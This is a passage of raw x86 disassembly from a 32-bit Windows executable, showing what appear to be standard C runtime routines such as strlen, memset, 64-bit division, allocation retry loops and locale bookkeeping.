  4046d1:	50                   	push   %eax
  4046d2:	ff d6                	call   *%esi
  4046d4:	8b 87 b4 00 00 00    	mov    0xb4(%edi),%eax
  4046da:	85 c0                	test   %eax,%eax
  4046dc:	74 03                	je     0x4046e1
  4046de:	50                   	push   %eax
  4046df:	ff d6                	call   *%esi
  4046e1:	8b 87 c0 00 00 00    	mov    0xc0(%edi),%eax
  4046e7:	85 c0                	test   %eax,%eax
  4046e9:	74 03                	je     0x4046ee
  4046eb:	50                   	push   %eax
  4046ec:	ff d6                	call   *%esi
  4046ee:	8d 5f 50             	lea    0x50(%edi),%ebx
  4046f1:	c7 45 08 06 00 00 00 	movl   $0x6,0x8(%ebp)
  4046f8:	81 7b f8 48 da 40 00 	cmpl   $0x40da48,-0x8(%ebx)
  4046ff:	74 09                	je     0x40470a
  404701:	8b 03                	mov    (%ebx),%eax
  404703:	85 c0                	test   %eax,%eax
  404705:	74 03                	je     0x40470a
  404707:	50                   	push   %eax
  404708:	ff d6                	call   *%esi
  40470a:	83 7b fc 00          	cmpl   $0x0,-0x4(%ebx)
  40470e:	74 0a                	je     0x40471a
  404710:	8b 43 04             	mov    0x4(%ebx),%eax
  404713:	85 c0                	test   %eax,%eax
  404715:	74 03                	je     0x40471a
  404717:	50                   	push   %eax
  404718:	ff d6                	call   *%esi
  40471a:	83 c3 10             	add    $0x10,%ebx
  40471d:	ff 4d 08             	decl   0x8(%ebp)
  404720:	75 d6                	jne    0x4046f8
  404722:	8b 87 d4 00 00 00    	mov    0xd4(%edi),%eax
  404728:	05 b4 00 00 00       	add    $0xb4,%eax
  40472d:	50                   	push   %eax
  40472e:	ff d6                	call   *%esi
  404730:	5e                   	pop    %esi
  404731:	5b                   	pop    %ebx
  404732:	8b c7                	mov    %edi,%eax
  404734:	5f                   	pop    %edi
  404735:	5d                   	pop    %ebp
  404736:	c3                   	ret
  404737:	85 ff                	test   %edi,%edi
  404739:	74 37                	je     0x404772
  40473b:	85 c0                	test   %eax,%eax
  40473d:	74 33                	je     0x404772
  40473f:	56                   	push   %esi
  404740:	8b 30                	mov    (%eax),%esi
  404742:	3b f7                	cmp    %edi,%esi
  404744:	74 28                	je     0x40476e
  404746:	57                   	push   %edi
  404747:	89 38                	mov    %edi,(%eax)
  404749:	e8 c1 fe ff ff       	call   0x40460f
  40474e:	59                   	pop    %ecx
  40474f:	85 f6                	test   %esi,%esi
  404751:	74 1b                	je     0x40476e
  404753:	56                   	push   %esi
  404754:	e8 45 ff ff ff       	call   0x40469e
  404759:	83 3e 00             	cmpl   $0x0,(%esi)
  40475c:	59                   	pop    %ecx
  40475d:	75 0f                	jne    0x40476e
  40475f:	81 fe 50 da 40 00    	cmp    $0x40da50,%esi
  404765:	74 07                	je     0x40476e
  404767:	56                   	push   %esi
  404768:	e8 59 fd ff ff       	call   0x4044c6
  40476d:	59                   	pop    %ecx
  40476e:	8b c7                	mov    %edi,%eax
  404770:	5e                   	pop    %esi
  404771:	c3                   	ret
  404772:	33 c0                	xor    %eax,%eax
  404774:	c3                   	ret
  404775:	6a 0c                	push   $0xc
  404777:	68 a8 b6 40 00       	push   $0x40b6a8
  40477c:	e8 9f e7 ff ff       	call   0x402f20
  404781:	e8 93 e4 ff ff       	call   0x402c19
  404786:	8b f0                	mov    %eax,%esi
  404788:	a1 44 da 40 00       	mov    0x40da44,%eax
  40478d:	85 46 70             	test   %eax,0x70(%esi)
  404790:	74 22                	je     0x4047b4
  404792:	83 7e 6c 00          	cmpl   $0x0,0x6c(%esi)
  404796:	74 1c                	je     0x4047b4
  404798:	e8 7c e4 ff ff       	call   0x402c19
  40479d:	8b 70 6c             	mov    0x6c(%eax),%esi
  4047a0:	85 f6                	test   %esi,%esi
  4047a2:	75 08                	jne    0x4047ac
  4047a4:	6a 20                	push   $0x20
  4047a6:	e8 f1 d3 ff ff       	call   0x401b9c
  4047ab:	59                   	pop    %ecx
  4047ac:	8b c6                	mov    %esi,%eax
  4047ae:	e8 b2 e7 ff ff       	call   0x402f65
  4047b3:	c3                   	ret
  4047b4:	6a 0c                	push   $0xc
  4047b6:	e8 9b 13 00 00       	call   0x405b56
  4047bb:	59                   	pop    %ecx
  4047bc:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4047c0:	8d 46 6c             	lea    0x6c(%esi),%eax
  4047c3:	8b 3d 28 db 40 00    	mov    0x40db28,%edi
  4047c9:	e8 69 ff ff ff       	call   0x404737
  4047ce:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4047d1:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4047d8:	e8 02 00 00 00       	call   0x4047df
  4047dd:	eb c1                	jmp    0x4047a0
  4047df:	6a 0c                	push   $0xc
  4047e1:	e8 96 12 00 00       	call   0x405a7c
  4047e6:	59                   	pop    %ecx
  4047e7:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  4047ea:	c3                   	ret
  4047eb:	6a 0c                	push   $0xc
  4047ed:	68 c8 b6 40 00       	push   $0x40b6c8
  4047f2:	e8 29 e7 ff ff       	call   0x402f20
  4047f7:	8b 75 08             	mov    0x8(%ebp),%esi
  4047fa:	85 f6                	test   %esi,%esi
  4047fc:	74 75                	je     0x404873
  4047fe:	83 3d a8 f9 40 00 03 	cmpl   $0x3,0x40f9a8
  404805:	75 43                	jne    0x40484a
  404807:	6a 04                	push   $0x4
  404809:	e8 48 13 00 00       	call   0x405b56
  40480e:	59                   	pop    %ecx
  40480f:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404813:	56                   	push   %esi
  404814:	e8 fc 1f 00 00       	call   0x406815
  404819:	59                   	pop    %ecx
  40481a:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40481d:	85 c0                	test   %eax,%eax
  40481f:	74 09                	je     0x40482a
  404821:	56                   	push   %esi
  404822:	50                   	push   %eax
  404823:	e8 1d 20 00 00       	call   0x406845
  404828:	59                   	pop    %ecx
  404829:	59                   	pop    %ecx
  40482a:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  404831:	e8 0b 00 00 00       	call   0x404841
  404836:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  40483a:	75 37                	jne    0x404873
  40483c:	ff 75 08             	push   0x8(%ebp)
  40483f:	eb 0a                	jmp    0x40484b
  404841:	6a 04                	push   $0x4
  404843:	e8 34 12 00 00       	call   0x405a7c
  404848:	59                   	pop    %ecx
  404849:	c3                   	ret
  40484a:	56                   	push   %esi
  40484b:	6a 00                	push   $0x0
  40484d:	ff 35 7c e3 40 00    	push   0x40e37c
  404853:	ff 15 c4 a0 40 00    	call   *0x40a0c4
  404859:	85 c0                	test   %eax,%eax
  40485b:	75 16                	jne    0x404873
  40485d:	e8 1d d1 ff ff       	call   0x40197f
  404862:	8b f0                	mov    %eax,%esi
  404864:	ff 15 8c a0 40 00    	call   *0x40a08c
  40486a:	50                   	push   %eax
  40486b:	e8 cd d0 ff ff       	call   0x40193d
  404870:	89 06                	mov    %eax,(%esi)
  404872:	59                   	pop    %ecx
  404873:	e8 ed e6 ff ff       	call   0x402f65
  404878:	c3                   	ret
  404879:	8b ff                	mov    %edi,%edi
  40487b:	56                   	push   %esi
  40487c:	57                   	push   %edi
  40487d:	33 ff                	xor    %edi,%edi
  40487f:	8d b7 38 db 40 00    	lea    0x40db38(%edi),%esi
  404885:	ff 36                	push   (%esi)
  404887:	e8 c6 e0 ff ff       	call   0x402952
  40488c:	83 c7 04             	add    $0x4,%edi
  40488f:	59                   	pop    %ecx
  404890:	89 06                	mov    %eax,(%esi)
  404892:	83 ff 28             	cmp    $0x28,%edi
  404895:	72 e8                	jb     0x40487f
  404897:	5f                   	pop    %edi
  404898:	5e                   	pop    %esi
  404899:	c3                   	ret
  40489a:	8b ff                	mov    %edi,%edi
  40489c:	55                   	push   %ebp
  40489d:	8b ec                	mov    %esp,%ebp
  40489f:	56                   	push   %esi
  4048a0:	57                   	push   %edi
  4048a1:	33 f6                	xor    %esi,%esi
  4048a3:	ff 75 08             	push   0x8(%ebp)
  4048a6:	e8 8d 3b 00 00       	call   0x408438
  4048ab:	8b f8                	mov    %eax,%edi
  4048ad:	59                   	pop    %ecx
  4048ae:	85 ff                	test   %edi,%edi
  4048b0:	75 27                	jne    0x4048d9
  4048b2:	39 05 c4 e3 40 00    	cmp    %eax,0x40e3c4
  4048b8:	76 1f                	jbe    0x4048d9
  4048ba:	56                   	push   %esi
  4048bb:	ff 15 6c a0 40 00    	call   *0x40a06c
  4048c1:	8d 86 e8 03 00 00    	lea    0x3e8(%esi),%eax
  4048c7:	3b 05 c4 e3 40 00    	cmp    0x40e3c4,%eax
  4048cd:	76 03                	jbe    0x4048d2
  4048cf:	83 c8 ff             	or     $0xffffffff,%eax
  4048d2:	8b f0                	mov    %eax,%esi
  4048d4:	83 f8 ff             	cmp    $0xffffffff,%eax
  4048d7:	75 ca                	jne    0x4048a3
  4048d9:	8b c7                	mov    %edi,%eax
  4048db:	5f                   	pop    %edi
  4048dc:	5e                   	pop    %esi
  4048dd:	5d                   	pop    %ebp
  4048de:	c3                   	ret
  4048df:	8b ff                	mov    %edi,%edi
  4048e1:	55                   	push   %ebp
  4048e2:	8b ec                	mov    %esp,%ebp
  4048e4:	56                   	push   %esi
  4048e5:	57                   	push   %edi
  4048e6:	33 f6                	xor    %esi,%esi
  4048e8:	6a 00                	push   $0x0
  4048ea:	ff 75 0c             	push   0xc(%ebp)
  4048ed:	ff 75 08             	push   0x8(%ebp)
  4048f0:	e8 0d 3c 00 00       	call   0x408502
  4048f5:	8b f8                	mov    %eax,%edi
  4048f7:	83 c4 0c             	add    $0xc,%esp
  4048fa:	85 ff                	test   %edi,%edi
  4048fc:	75 27                	jne    0x404925
  4048fe:	39 05 c4 e3 40 00    	cmp    %eax,0x40e3c4
  404904:	76 1f                	jbe    0x404925
  404906:	56                   	push   %esi
  404907:	ff 15 6c a0 40 00    	call   *0x40a06c
  40490d:	8d 86 e8 03 00 00    	lea    0x3e8(%esi),%eax
  404913:	3b 05 c4 e3 40 00    	cmp    0x40e3c4,%eax
  404919:	76 03                	jbe    0x40491e
  40491b:	83 c8 ff             	or     $0xffffffff,%eax
  40491e:	8b f0                	mov    %eax,%esi
  404920:	83 f8 ff             	cmp    $0xffffffff,%eax
  404923:	75 c3                	jne    0x4048e8
  404925:	8b c7                	mov    %edi,%eax
  404927:	5f                   	pop    %edi
  404928:	5e                   	pop    %esi
  404929:	5d                   	pop    %ebp
  40492a:	c3                   	ret
  40492b:	8b ff                	mov    %edi,%edi
  40492d:	55                   	push   %ebp
  40492e:	8b ec                	mov    %esp,%ebp
  404930:	56                   	push   %esi
  404931:	57                   	push   %edi
  404932:	33 f6                	xor    %esi,%esi
  404934:	ff 75 0c             	push   0xc(%ebp)
  404937:	ff 75 08             	push   0x8(%ebp)
  40493a:	e8 e1 3c 00 00       	call   0x408620
  40493f:	8b f8                	mov    %eax,%edi
  404941:	59                   	pop    %ecx
  404942:	59                   	pop    %ecx
  404943:	85 ff                	test   %edi,%edi
  404945:	75 2c                	jne    0x404973
  404947:	39 45 0c             	cmp    %eax,0xc(%ebp)
  40494a:	74 27                	je     0x404973
  40494c:	39 05 c4 e3 40 00    	cmp    %eax,0x40e3c4
  404952:	76 1f                	jbe    0x404973
  404954:	56                   	push   %esi
  404955:	ff 15 6c a0 40 00    	call   *0x40a06c
  40495b:	8d 86 e8 03 00 00    	lea    0x3e8(%esi),%eax
  404961:	3b 05 c4 e3 40 00    	cmp    0x40e3c4,%eax
  404967:	76 03                	jbe    0x40496c
  404969:	83 c8 ff             	or     $0xffffffff,%eax
  40496c:	8b f0                	mov    %eax,%esi
  40496e:	83 f8 ff             	cmp    $0xffffffff,%eax
  404971:	75 c1                	jne    0x404934
  404973:	8b c7                	mov    %edi,%eax
  404975:	5f                   	pop    %edi
  404976:	5e                   	pop    %esi
  404977:	5d                   	pop    %ebp
  404978:	c3                   	ret
  404979:	a1 60 db 40 00       	mov    0x40db60,%eax
  40497e:	83 c8 01             	or     $0x1,%eax
  404981:	33 c9                	xor    %ecx,%ecx
  404983:	39 05 c8 e3 40 00    	cmp    %eax,0x40e3c8
  404989:	0f 94 c1             	sete   %cl
  40498c:	8b c1                	mov    %ecx,%eax
  40498e:	c3                   	ret
  40498f:	cc                   	int3
  404990:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404994:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  40499a:	74 24                	je     0x4049c0
  40499c:	8a 01                	mov    (%ecx),%al
  40499e:	83 c1 01             	add    $0x1,%ecx
  4049a1:	84 c0                	test   %al,%al
  4049a3:	74 4e                	je     0x4049f3
  4049a5:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  4049ab:	75 ef                	jne    0x40499c
  4049ad:	05 00 00 00 00       	add    $0x0,%eax
  4049b2:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4049b9:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4049c0:	8b 01                	mov    (%ecx),%eax
  4049c2:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  4049c7:	03 d0                	add    %eax,%edx
  4049c9:	83 f0 ff             	xor    $0xffffffff,%eax
  4049cc:	33 c2                	xor    %edx,%eax
  4049ce:	83 c1 04             	add    $0x4,%ecx
  4049d1:	a9 00 01 01 81       	test   $0x81010100,%eax
  4049d6:	74 e8                	je     0x4049c0
  4049d8:	8b 41 fc             	mov    -0x4(%ecx),%eax
  4049db:	84 c0                	test   %al,%al
  4049dd:	74 32                	je     0x404a11
  4049df:	84 e4                	test   %ah,%ah
  4049e1:	74 24                	je     0x404a07
  4049e3:	a9 00 00 ff 00       	test   $0xff0000,%eax
  4049e8:	74 13                	je     0x4049fd
  4049ea:	a9 00 00 00 ff       	test   $0xff000000,%eax
  4049ef:	74 02                	je     0x4049f3
  4049f1:	eb cd                	jmp    0x4049c0
  4049f3:	8d 41 ff             	lea    -0x1(%ecx),%eax
  4049f6:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4049fa:	2b c1                	sub    %ecx,%eax
  4049fc:	c3                   	ret
  4049fd:	8d 41 fe             	lea    -0x2(%ecx),%eax
  404a00:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404a04:	2b c1                	sub    %ecx,%eax
  404a06:	c3                   	ret
  404a07:	8d 41 fd             	lea    -0x3(%ecx),%eax
  404a0a:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404a0e:	2b c1                	sub    %ecx,%eax
  404a10:	c3                   	ret
  404a11:	8d 41 fc             	lea    -0x4(%ecx),%eax
  404a14:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404a18:	2b c1                	sub    %ecx,%eax
  404a1a:	c3                   	ret
  404a1b:	8b ff                	mov    %edi,%edi
  404a1d:	55                   	push   %ebp
  404a1e:	8b ec                	mov    %esp,%ebp
  404a20:	83 ec 10             	sub    $0x10,%esp
  404a23:	53                   	push   %ebx
  404a24:	56                   	push   %esi
  404a25:	8b 75 0c             	mov    0xc(%ebp),%esi
  404a28:	33 db                	xor    %ebx,%ebx
  404a2a:	57                   	push   %edi
  404a2b:	8b 7d 10             	mov    0x10(%ebp),%edi
  404a2e:	3b f3                	cmp    %ebx,%esi
  404a30:	75 14                	jne    0x404a46
  404a32:	3b fb                	cmp    %ebx,%edi
  404a34:	76 10                	jbe    0x404a46
  404a36:	8b 45 08             	mov    0x8(%ebp),%eax
  404a39:	3b c3                	cmp    %ebx,%eax
  404a3b:	74 02                	je     0x404a3f
  404a3d:	89 18                	mov    %ebx,(%eax)
  404a3f:	33 c0                	xor    %eax,%eax
  404a41:	e9 83 00 00 00       	jmp    0x404ac9
  404a46:	8b 45 08             	mov    0x8(%ebp),%eax
  404a49:	3b c3                	cmp    %ebx,%eax
  404a4b:	74 03                	je     0x404a50
  404a4d:	83 08 ff             	orl    $0xffffffff,(%eax)
  404a50:	81 ff ff ff ff 7f    	cmp    $0x7fffffff,%edi
  404a56:	76 1b                	jbe    0x404a73
  404a58:	e8 22 cf ff ff       	call   0x40197f
  404a5d:	6a 16                	push   $0x16
  404a5f:	5e                   	pop    %esi
  404a60:	53                   	push   %ebx
  404a61:	53                   	push   %ebx
  404a62:	53                   	push   %ebx
  404a63:	53                   	push   %ebx
  404a64:	53                   	push   %ebx
  404a65:	89 30                	mov    %esi,(%eax)
  404a67:	e8 ab ce ff ff       	call   0x401917
  404a6c:	83 c4 14             	add    $0x14,%esp
  404a6f:	8b c6                	mov    %esi,%eax
  404a71:	eb 56                	jmp    0x404ac9
  404a73:	ff 75 18             	push   0x18(%ebp)
  404a76:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  404a79:	e8 db cc ff ff       	call   0x401759
  404a7e:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404a81:	39 58 14             	cmp    %ebx,0x14(%eax)
  404a84:	0f 85 9c 00 00 00    	jne    0x404b26
  404a8a:	66 8b 45 14          	mov    0x14(%ebp),%ax
  404a8e:	b9 ff 00 00 00       	mov    $0xff,%ecx
  404a93:	66 3b c1             	cmp    %cx,%ax
  404a96:	76 36                	jbe    0x404ace
  404a98:	3b f3                	cmp    %ebx,%esi
  404a9a:	74 0f                	je     0x404aab
  404a9c:	3b fb                	cmp    %ebx,%edi
  404a9e:	76 0b                	jbe    0x404aab
  404aa0:	57                   	push   %edi
  404aa1:	53                   	push   %ebx
  404aa2:	56                   	push   %esi
  404aa3:	e8 f8 01 00 00       	call   0x404ca0
  404aa8:	83 c4 0c             	add    $0xc,%esp
  404aab:	e8 cf ce ff ff       	call   0x40197f
  404ab0:	c7 00 2a 00 00 00    	movl   $0x2a,(%eax)
  404ab6:	e8 c4 ce ff ff       	call   0x40197f
  404abb:	8b 00                	mov    (%eax),%eax
  404abd:	38 5d fc             	cmp    %bl,-0x4(%ebp)
  404ac0:	74 07                	je     0x404ac9
  404ac2:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  404ac5:	83 61 70 fd          	andl   $0xfffffffd,0x70(%ecx)
  404ac9:	5f                   	pop    %edi
  404aca:	5e                   	pop    %esi
  404acb:	5b                   	pop    %ebx
  404acc:	c9                   	leave
  404acd:	c3                   	ret
  404ace:	3b f3                	cmp    %ebx,%esi
  404ad0:	74 32                	je     0x404b04
  404ad2:	3b fb                	cmp    %ebx,%edi
  404ad4:	77 2c                	ja     0x404b02
  404ad6:	e8 a4 ce ff ff       	call   0x40197f
  404adb:	6a 22                	push   $0x22
  404add:	5e                   	pop    %esi
  404ade:	53                   	push   %ebx
  404adf:	53                   	push   %ebx
  404ae0:	53                   	push   %ebx
  404ae1:	53                   	push   %ebx
  404ae2:	53                   	push   %ebx
  404ae3:	89 30                	mov    %esi,(%eax)
  404ae5:	e8 2d ce ff ff       	call   0x401917
  404aea:	83 c4 14             	add    $0x14,%esp
  404aed:	38 5d fc             	cmp    %bl,-0x4(%ebp)
  404af0:	0f 84 79 ff ff ff    	je     0x404a6f
  404af6:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404af9:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  404afd:	e9 6d ff ff ff       	jmp    0x404a6f
  404b02:	88 06                	mov    %al,(%esi)
  404b04:	8b 45 08             	mov    0x8(%ebp),%eax
  404b07:	3b c3                	cmp    %ebx,%eax
  404b09:	74 06                	je     0x404b11
  404b0b:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  404b11:	38 5d fc             	cmp    %bl,-0x4(%ebp)
  404b14:	0f 84 25 ff ff ff    	je     0x404a3f
  404b1a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404b1d:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  404b21:	e9 19 ff ff ff       	jmp    0x404a3f
  404b26:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  404b29:	51                   	push   %ecx
  404b2a:	53                   	push   %ebx
  404b2b:	57                   	push   %edi
  404b2c:	56                   	push   %esi
  404b2d:	6a 01                	push   $0x1
  404b2f:	8d 4d 14             	lea    0x14(%ebp),%ecx
  404b32:	51                   	push   %ecx
  404b33:	53                   	push   %ebx
  404b34:	89 5d 0c             	mov    %ebx,0xc(%ebp)
  404b37:	ff 70 04             	push   0x4(%eax)
  404b3a:	ff 15 88 a0 40 00    	call   *0x40a088
  404b40:	3b c3                	cmp    %ebx,%eax
  404b42:	74 14                	je     0x404b58
  404b44:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  404b47:	0f 85 5e ff ff ff    	jne    0x404aab
  404b4d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404b50:	3b cb                	cmp    %ebx,%ecx
  404b52:	74 bd                	je     0x404b11
  404b54:	89 01                	mov    %eax,(%ecx)
  404b56:	eb b9                	jmp    0x404b11
  404b58:	ff 15 8c a0 40 00    	call   *0x40a08c
  404b5e:	83 f8 7a             	cmp    $0x7a,%eax
  404b61:	0f 85 44 ff ff ff    	jne    0x404aab
  404b67:	3b f3                	cmp    %ebx,%esi
  404b69:	0f 84 67 ff ff ff    	je     0x404ad6
  404b6f:	3b fb                	cmp    %ebx,%edi
  404b71:	0f 86 5f ff ff ff    	jbe    0x404ad6
  404b77:	57                   	push   %edi
  404b78:	53                   	push   %ebx
  404b79:	56                   	push   %esi
  404b7a:	e8 21 01 00 00       	call   0x404ca0
  404b7f:	83 c4 0c             	add    $0xc,%esp
  404b82:	e9 4f ff ff ff       	jmp    0x404ad6
  404b87:	8b ff                	mov    %edi,%edi
  404b89:	55                   	push   %ebp
  404b8a:	8b ec                	mov    %esp,%ebp
  404b8c:	6a 00                	push   $0x0
  404b8e:	ff 75 14             	push   0x14(%ebp)
  404b91:	ff 75 10             	push   0x10(%ebp)
  404b94:	ff 75 0c             	push   0xc(%ebp)
  404b97:	ff 75 08             	push   0x8(%ebp)
  404b9a:	e8 7c fe ff ff       	call   0x404a1b
  404b9f:	83 c4 14             	add    $0x14,%esp
  404ba2:	5d                   	pop    %ebp
  404ba3:	c3                   	ret
  404ba4:	8b ff                	mov    %edi,%edi
  404ba6:	55                   	push   %ebp
  404ba7:	8b ec                	mov    %esp,%ebp
  404ba9:	83 ec 10             	sub    $0x10,%esp
  404bac:	ff 75 0c             	push   0xc(%ebp)
  404baf:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  404bb2:	e8 a2 cb ff ff       	call   0x401759
  404bb7:	0f b6 45 08          	movzbl 0x8(%ebp),%eax
  404bbb:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404bbe:	8b 89 c8 00 00 00    	mov    0xc8(%ecx),%ecx
  404bc4:	0f b7 04 41          	movzwl (%ecx,%eax,2),%eax
  404bc8:	25 00 80 00 00       	and    $0x8000,%eax
  404bcd:	80 7d fc 00          	cmpb   $0x0,-0x4(%ebp)
  404bd1:	74 07                	je     0x404bda
  404bd3:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  404bd6:	83 61 70 fd          	andl   $0xfffffffd,0x70(%ecx)
  404bda:	c9                   	leave
  404bdb:	c3                   	ret
  404bdc:	8b ff                	mov    %edi,%edi
  404bde:	55                   	push   %ebp
  404bdf:	8b ec                	mov    %esp,%ebp
  404be1:	6a 00                	push   $0x0
  404be3:	ff 75 08             	push   0x8(%ebp)
  404be6:	e8 b9 ff ff ff       	call   0x404ba4
  404beb:	59                   	pop    %ecx
  404bec:	59                   	pop    %ecx
  404bed:	5d                   	pop    %ebp
  404bee:	c3                   	ret
  404bef:	3b 0d 60 db 40 00    	cmp    0x40db60,%ecx
  404bf5:	75 02                	jne    0x404bf9
  404bf7:	f3 c3                	repz ret
  404bf9:	e9 3d 3c 00 00       	jmp    0x40883b
  404bfe:	cc                   	int3
  404bff:	cc                   	int3
  404c00:	56                   	push   %esi
  404c01:	8b 44 24 14          	mov    0x14(%esp),%eax
  404c05:	0b c0                	or     %eax,%eax
  404c07:	75 28                	jne    0x404c31
  404c09:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  404c0d:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404c11:	33 d2                	xor    %edx,%edx
  404c13:	f7 f1                	div    %ecx
  404c15:	8b d8                	mov    %eax,%ebx
  404c17:	8b 44 24 08          	mov    0x8(%esp),%eax
  404c1b:	f7 f1                	div    %ecx
  404c1d:	8b f0                	mov    %eax,%esi
  404c1f:	8b c3                	mov    %ebx,%eax
  404c21:	f7 64 24 10          	mull   0x10(%esp)
  404c25:	8b c8                	mov    %eax,%ecx
  404c27:	8b c6                	mov    %esi,%eax
  404c29:	f7 64 24 10          	mull   0x10(%esp)
  404c2d:	03 d1                	add    %ecx,%edx
  404c2f:	eb 47                	jmp    0x404c78
  404c31:	8b c8                	mov    %eax,%ecx
  404c33:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  404c37:	8b 54 24 0c          	mov    0xc(%esp),%edx
  404c3b:	8b 44 24 08          	mov    0x8(%esp),%eax
  404c3f:	d1 e9                	shr    $1,%ecx
  404c41:	d1 db                	rcr    $1,%ebx
  404c43:	d1 ea                	shr    $1,%edx
  404c45:	d1 d8                	rcr    $1,%eax
  404c47:	0b c9                	or     %ecx,%ecx
  404c49:	75 f4                	jne    0x404c3f
  404c4b:	f7 f3                	div    %ebx
  404c4d:	8b f0                	mov    %eax,%esi
  404c4f:	f7 64 24 14          	mull   0x14(%esp)
  404c53:	8b c8                	mov    %eax,%ecx
  404c55:	8b 44 24 10          	mov    0x10(%esp),%eax
  404c59:	f7 e6                	mul    %esi
  404c5b:	03 d1                	add    %ecx,%edx
  404c5d:	72 0e                	jb     0x404c6d
  404c5f:	3b 54 24 0c          	cmp    0xc(%esp),%edx
  404c63:	77 08                	ja     0x404c6d
  404c65:	72 0f                	jb     0x404c76
  404c67:	3b 44 24 08          	cmp    0x8(%esp),%eax
  404c6b:	76 09                	jbe    0x404c76
  404c6d:	4e                   	dec    %esi
  404c6e:	2b 44 24 10          	sub    0x10(%esp),%eax
  404c72:	1b 54 24 14          	sbb    0x14(%esp),%edx
  404c76:	33 db                	xor    %ebx,%ebx
  404c78:	2b 44 24 08          	sub    0x8(%esp),%eax
  404c7c:	1b 54 24 0c          	sbb    0xc(%esp),%edx
  404c80:	f7 da                	neg    %edx
  404c82:	f7 d8                	neg    %eax
  404c84:	83 da 00             	sbb    $0x0,%edx
  404c87:	8b ca                	mov    %edx,%ecx
  404c89:	8b d3                	mov    %ebx,%edx
  404c8b:	8b d9                	mov    %ecx,%ebx
  404c8d:	8b c8                	mov    %eax,%ecx
  404c8f:	8b c6                	mov    %esi,%eax
  404c91:	5e                   	pop    %esi
  404c92:	c2 10 00             	ret    $0x10
  404c95:	83 25 7c e9 40 00 00 	andl   $0x0,0x40e97c
  404c9c:	c3                   	ret
  404c9d:	cc                   	int3
  404c9e:	cc                   	int3
  404c9f:	cc                   	int3
  404ca0:	8b 54 24 0c          	mov    0xc(%esp),%edx
  404ca4:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404ca8:	85 d2                	test   %edx,%edx
  404caa:	74 69                	je     0x404d15
  404cac:	33 c0                	xor    %eax,%eax
  404cae:	8a 44 24 08          	mov    0x8(%esp),%al
  404cb2:	84 c0                	test   %al,%al
  404cb4:	75 16                	jne    0x404ccc
  404cb6:	81 fa 00 01 00 00    	cmp    $0x100,%edx
  404cbc:	72 0e                	jb     0x404ccc
  404cbe:	83 3d 60 e9 40 00 00 	cmpl   $0x0,0x40e960
  404cc5:	74 05                	je     0x404ccc
  404cc7:	e9 cc 3c 00 00       	jmp    0x408998
  404ccc:	57                   	push   %edi
  404ccd:	8b f9                	mov    %ecx,%edi
  404ccf:	83 fa 04             	cmp    $0x4,%edx
  404cd2:	72 31                	jb     0x404d05
  404cd4:	f7 d9                	neg    %ecx
  404cd6:	83 e1 03             	and    $0x3,%ecx
  404cd9:	74 0c                	je     0x404ce7
  404cdb:	2b d1                	sub    %ecx,%edx
  404cdd:	88 07                	mov    %al,(%edi)
  404cdf:	83 c7 01             	add    $0x1,%edi
  404ce2:	83 e9 01             	sub    $0x1,%ecx
  404ce5:	75 f6                	jne    0x404cdd
  404ce7:	8b c8                	mov    %eax,%ecx
  404ce9:	c1 e0 08             	shl    $0x8,%eax
  404cec:	03 c1                	add    %ecx,%eax
  404cee:	8b c8                	mov    %eax,%ecx
  404cf0:	c1 e0 10             	shl    $0x10,%eax
  404cf3:	03 c1                	add    %ecx,%eax
  404cf5:	8b ca                	mov    %edx,%ecx
  404cf7:	83 e2 03             	and    $0x3,%edx
  404cfa:	c1 e9 02             	shr    $0x2,%ecx
  404cfd:	74 06                	je     0x404d05
  404cff:	f3 ab                	rep stos %eax,%es:(%edi)
  404d01:	85 d2                	test   %edx,%edx
  404d03:	74 0a                	je     0x404d0f
  404d05:	88 07                	mov    %al,(%edi)
  404d07:	83 c7 01             	add    $0x1,%edi
  404d0a:	83 ea 01             	sub    $0x1,%edx
  404d0d:	75 f6                	jne    0x404d05
  404d0f:	8b 44 24 08          	mov    0x8(%esp),%eax
  404d13:	5f                   	pop    %edi
  404d14:	c3                   	ret
  404d15:	8b 44 24 04          	mov    0x4(%esp),%eax
  404d19:	c3                   	ret
  404d1a:	f6 41 0c 40          	testb  $0x40,0xc(%ecx)
  404d1e:	74 06                	je     0x404d26
  404d20:	83 79 08 00          	cmpl   $0x0,0x8(%ecx)
  404d24:	74 24                	je     0x404d4a
  404d26:	ff 49 04             	decl   0x4(%ecx)
  404d29:	78 0b                	js     0x404d36
  404d2b:	8b 11                	mov    (%ecx),%edx
  404d2d:	88 02                	mov    %al,(%edx)
  404d2f:	ff 01                	incl   (%ecx)
  404d31:	0f b6 c0             	movzbl %al,%eax
  404d34:	eb 0c                	jmp    0x404d42
